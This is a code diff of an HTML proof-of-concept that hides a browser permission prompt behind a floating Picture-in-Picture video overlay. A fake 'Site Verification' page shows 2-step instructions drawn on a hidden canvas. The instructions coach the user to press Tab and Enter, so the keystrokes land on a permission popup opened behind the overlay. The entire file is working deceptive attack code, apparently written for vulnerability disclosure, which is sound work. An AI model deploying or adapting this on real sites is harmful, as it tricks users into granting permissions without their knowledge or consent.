@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Simple 2-Step PiP Game</title>
+  <title>Video PiP Overlap PoC</title>
   <style>
     body {
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
@@ -15,9 +15,9 @@
       background-color: #f0f0f0;
       font-family: Arial, sans-serif;
     }
-
+    h2 { margin-bottom: 20px; }
     button {
-      padding: 10px 20px;
+      padding: 12px 28px;
       font-size: 16px;
       cursor: pointer;
       background-color: #0dd438;
@@ -25,131 +25,199 @@
       border: none;
       border-radius: 5px;
     }
-
-    .step-heading {
-      font-size: 18px;
-      font-weight: bold;
-      margin-bottom: 10px;
-    }
-
-    .hidden {
-      display: none;
+    /* Hidden video + canvas — never shown to user */
+    #hidden-video, #instruction-canvas {
+      position: fixed;
+      left: -9999px;
+      top: -9999px;
     }
   </style>
 </head>
-
 <body>
-  <center style="position: absolute; top: 300px;">
-    <h2>Site Verification Required</h2>
-  </center>
-  <button id="open-pip-button" onclick="openPip()">Verify</button>
-
+  <h2>Site Verification Required</h2>
+  <button id="verify-btn">Verify</button>
+  <!-- Hidden canvas we draw instructions on -->
+  <canvas id="instruction-canvas" width="640" height="480"></canvas>
+  <!-- Hidden video element fed by canvas stream -->
+  <video id="hidden-video" muted autoplay></video>
   <script>
-    let pipWindow;
-    let popupWindow; // Reference to the permission popup
-
-    async function openPip() {
+    const canvas = document.getElementById('instruction-canvas');
+    const ctx = canvas.getContext('2d');
+    const video = document.getElementById('hidden-video');
+    let popupWindow = null;
+    let currentStep = 1;
+    let animFrame = null;
+    /* ── Draw instructions onto the canvas ── */
+    function drawStep(step) {
+      // Background
+      ctx.fillStyle = '#f0f0f0';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      // Title
+      ctx.fillStyle = '#333';
+      ctx.font = 'bold 28px Arial';
+      ctx.textAlign = 'center';
+      ctx.fillText('2-Step Verification', canvas.width / 2, 60);
+      // Divider
+      ctx.strokeStyle = '#ccc';
+      ctx.beginPath();
+      ctx.moveTo(40, 80);
+      ctx.lineTo(canvas.width - 40, 80);
+      ctx.stroke();
+      if (step === 1) {
+        // Step 1
+        ctx.fillStyle = '#0dd438';
+        ctx.font = 'bold 22px Arial';
+        ctx.fillText('Step 1 of 2', canvas.width / 2, 130);
+        ctx.fillStyle = '#222';
+        ctx.font = '20px Arial';
+        ctx.fillText('Press the Tab key 3 times,', canvas.width / 2, 200);
+        ctx.fillText('then press Enter to continue.', canvas.width / 2, 235);
+        // Visual Tab key hints
+        drawKey(ctx, 200, 280, 'Tab');
+        drawKey(ctx, 280, 280, 'Tab');
+        drawKey(ctx, 360, 280, 'Tab');
+        drawArrow(ctx, 400, 295, 430, 295);
+        drawKey(ctx, 440, 280, 'Enter');
+        // Pulsing indicator
+        const alpha = 0.5 + 0.5 * Math.sin(Date.now() / 300);
+        ctx.fillStyle = `rgba(13, 212, 56, ${alpha})`;
+        ctx.beginPath();
+        ctx.arc(canvas.width / 2, 380, 12, 0, Math.PI * 2);
+        ctx.fill();
+        ctx.fillStyle = '#555';
+        ctx.font = '14px Arial';
+        ctx.fillText('Waiting for input…', canvas.width / 2, 420);
+      } else if (step === 2) {
+        // Step 2
+        ctx.fillStyle = '#0dd438';
+        ctx.font = 'bold 22px Arial';
+        ctx.fillText('Step 2 of 2', canvas.width / 2, 130);
+        ctx.fillStyle = '#222';
+        ctx.font = '20px Arial';
+        ctx.fillText('Press Enter twice to', canvas.width / 2, 200);
+        ctx.fillText('complete verification.', canvas.width / 2, 235);
+        drawKey(ctx, 250, 280, 'Enter');
+        drawKey(ctx, 340, 280, 'Enter');
+        const alpha = 0.5 + 0.5 * Math.sin(Date.now() / 300);
+        ctx.fillStyle = `rgba(13, 212, 56, ${alpha})`;
+        ctx.beginPath();
+        ctx.arc(canvas.width / 2, 370, 12, 0, Math.PI * 2);
+        ctx.fill();
+        ctx.fillStyle = '#555';
+        ctx.font = '14px Arial';
+        ctx.fillText('Almost done…', canvas.width / 2, 410);
+      } else if (step === 3) {
+        ctx.fillStyle = '#0dd438';
+        ctx.font = 'bold 26px Arial';
+        ctx.fillText('✓ Verified!', canvas.width / 2, 200);
+        ctx.fillStyle = '#555';
+        ctx.font = '18px Arial';
+        ctx.fillText('You may close this window.', canvas.width / 2, 250);
+      }
+    }
+    function drawKey(ctx, x, y, label) {
+      ctx.fillStyle = '#fff';
+      ctx.strokeStyle = '#aaa';
+      ctx.lineWidth = 2;
+      const w = label === 'Enter' ? 70 : 55;
+      roundRect(ctx, x, y, w, 36, 6);
+      ctx.fill();
+      ctx.stroke();
+      ctx.fillStyle = '#333';
+      ctx.font = 'bold 14px Arial';
+      ctx.textAlign = 'center';
+      ctx.fillText(label, x + w / 2, y + 23);
+    }
+    function drawArrow(ctx, x1, y1, x2, y2) {
+      ctx.strokeStyle = '#999';
+      ctx.lineWidth = 2;
+      ctx.beginPath();
+      ctx.moveTo(x1, y1);
+      ctx.lineTo(x2, y2);
+      ctx.stroke();
+      ctx.beginPath();
+      ctx.moveTo(x2, y2);
+      ctx.lineTo(x2 - 6, y2 - 4);
+      ctx.lineTo(x2 - 6, y2 + 4);
+      ctx.closePath();
+      ctx.fillStyle = '#999';
+      ctx.fill();
+    }
+    function roundRect(ctx, x, y, w, h, r) {
+      ctx.beginPath();
+      ctx.moveTo(x + r, y);
+      ctx.lineTo(x + w - r, y);
+      ctx.quadraticCurveTo(x + w, y, x + w, y + r);
+      ctx.lineTo(x + w, y + h - r);
+      ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
+      ctx.lineTo(x + r, y + h);
+      ctx.quadraticCurveTo(x, y + h, x, y + h - r);
+      ctx.lineTo(x, y + r);
+      ctx.quadraticCurveTo(x, y, x + r, y);
+      ctx.closePath();
+    }
+    /* ── Animation loop: continuously re-draw canvas ── */
+    function animate() {
+      drawStep(currentStep);
+      animFrame = requestAnimationFrame(animate);
+    }
+    /* ── Main trigger ── */
+    document.getElementById('verify-btn').addEventListener('click', async () => {
+      // Start canvas animation
+      currentStep = 1;
+      animate();
+      // Feed canvas into a video stream
+      const stream = canvas.captureStream(30);
+      video.srcObject = stream;
+      await video.play();
+      // Request Video PiP — this creates the floating overlay
       try {
-        pipWindow = await documentPictureInPicture.requestWindow({
-          width: 1000,
-          height: 1000,
-        });
-
-        const style = pipWindow.document.createElement('style');
-        style.textContent = `
-          body {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f0f0;
-            font-family: Arial, sans-serif;
-          }
-          .step-heading, #message, #confirm-button, #exit-message, #start-button  {
-            font-size: 24px;
-            text-align: center;
-          }
-          #message, #confirm-button, #exit-message, #start-button  {
-            display: none;
-            font-weight: bold;
-            margin-top: 20px;
-          }
-          #confirm-button, #start-button {
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
-      background-color: #0dd438;
-      color: white;
-      border: none;
-      border-radius: 5px;
-          }
-        `;
-        pipWindow.document.head.appendChild(style);
-
-        // Create and add elements to PiP window
-        createAndAppendElement(pipWindow, 'button', 'start-button', 'Click to Start 2-Step Verification process');
-        createAndAppendElement(pipWindow, 'div', 'step1-heading', 'Step 1:', 'none', 'step-heading');
-        createAndAppendElement(pipWindow, 'div', 'message', 'Press Tab 3 times and then hit confirm for step 2', 'none');
-        createAndAppendElement(pipWindow, 'button', 'confirm-button', 'Confirm', 'none');
-        createAndAppendElement(pipWindow, 'div', 'step2-heading', 'Step 2:', 'none', 'step-heading');
-        createAndAppendElement(pipWindow, 'div', 'exit-message', 'Press Enter twice to Exit and verify', 'none');
-
-        // Add event listeners
-        addEventListeners(pipWindow);
-
-      } catch (error) {
-        console.error('Error opening PiP window:', error);
+        await video.requestPictureInPicture();
+      } catch (e) {
+        console.error('PiP failed:', e);
+        return;
       }
-    }
-
-    function createAndAppendElement(pipWindow, tagName, id, textContent, display = 'block', className = '') {
-      const element = pipWindow.document.createElement(tagName);
-      element.id = id;
-      element.textContent = textContent;
-      element.style.display = display;
-      if (className) {
-        element.className = className;
-      }
-      pipWindow.document.body.appendChild(element);
-    }
-
-    function addEventListeners(pipWindow) {
-      // Start button click event
-      const startButton = pipWindow.document.getElementById('start-button');
-      startButton.addEventListener('click', () => {
-        popupWindow = window.open('permission.html', 'popupWindow', 'width=100,height=100,left=850,top=650');
-        startButton.style.display = 'none';
-        pipWindow.document.getElementById('step1-heading').style.display = 'block';
-        pipWindow.document.getElementById('message').style.display = 'block';
-        pipWindow.document.getElementById('confirm-button').style.display = 'block';
-      });
-
-      // Confirm button click event
-      const confirmButton = pipWindow.document.getElementById('confirm-button');
-      confirmButton.addEventListener('click', () => {
-        pipWindow.document.getElementById('step1-heading').style.display = 'none';
-        pipWindow.document.getElementById('message').style.display = 'none';
-        confirmButton.style.display = 'none';
-        pipWindow.document.getElementById('step2-heading').style.display = 'block';
-        pipWindow.document.getElementById('exit-message').style.display = 'block';
-      });
-
-      // Exit on Enter key press
-      pipWindow.addEventListener('keydown', (event) => {
-        if (event.key === 'Enter') {
-          pipWindow.close();
-          // Close the permission popup after few seconds
-          setTimeout(() => {
-            if (popupWindow) {
-              popupWindow.close();
+      // Open the small permission popup BEHIND the PiP window
+      popupWindow = window.open(
+        'permission.html',
+        'permPopup',
+        'width=100,height=100,left=850,top=650'
+      );
+      // Track Tab presses to advance steps
+      let tabCount = 0;
+      let enterCount = 0;
+      window.addEventListener('keydown', function handler(e) {
+        if (currentStep === 1) {
+          if (e.key === 'Tab') {
+            tabCount++;
+          }
+          if (e.key === 'Enter' && tabCount >= 3) {
+            currentStep = 2;
+            enterCount = 0;
+          }
+        } else if (currentStep === 2) {
+          if (e.key === 'Enter') {
+            enterCount++;
+            if (enterCount >= 2) {
+              currentStep = 3;
+              // Close everything after a beat
+              setTimeout(() => {
+                if (document.pictureInPictureElement) {
+                  document.exitPictureInPicture().catch(() => {});
+                }
+                cancelAnimationFrame(animFrame);
+                if (popupWindow) popupWindow.close();
+                window.removeEventListener('keydown', handler);
+              }, 1200);
             }
-          }, 500);
+          }
         }
       });
-    }
+    });
+    // Clean up if user manually closes PiP
+    video.addEventListener('leavepictureinpicture', () => {
+      cancelAnimationFrame(animFrame);
+    });
   </script>
 </body>
-
 </html>
